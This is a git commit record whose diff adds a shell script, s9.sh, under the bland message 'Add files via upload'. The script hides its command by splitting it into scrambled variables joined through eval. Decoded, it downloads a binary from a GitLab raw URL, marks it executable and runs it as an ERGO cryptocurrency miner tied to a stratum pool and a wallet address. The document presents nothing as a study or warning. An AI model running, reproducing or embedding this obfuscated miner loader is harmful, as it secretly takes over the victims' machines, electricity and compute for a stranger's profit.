8f23df8f61226d24be0ca0d7ebfcf17c16d89934
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-09-16 19:17:19 +0700

    Add files via upload

---
+++ s9.sh
@@ -0,0 +1,3 @@
+z="
+";qz='KeXh';wz='.w1';iz='user';gz=':333';uz='PRXM';fz='.org';Xz='ERGO';Zz='ool ';Az='wget';pz='FuuV';lz='2SoB';Oz='btc ';Sz='&& .';nz='TWAt';Pz='&& c';Qz='hmod';Mz='ain/';tz='VTzj';Bz=' htt';Ez='lab.';Wz='oin ';jz=' 9et';Cz='ps:/';ez='pool';Fz='com/';sz='R5ng';rz='LGK8';Tz='/coi';vz='WCFt';az='stra';Dz='/git';Hz='pbon';Yz=' --p';Lz='aw/m';dz='.fly';Iz='eng/';Vz=' --c';bz='tum-';mz='VyFd';Nz='coin';Kz='/-/r';Gz='asia';Uz='nbtc';oz='iMsg';cz='ergo';kz='sJCx';Rz=' +x ';hz='3 --';Jz='nega';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Nz$Oz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz"
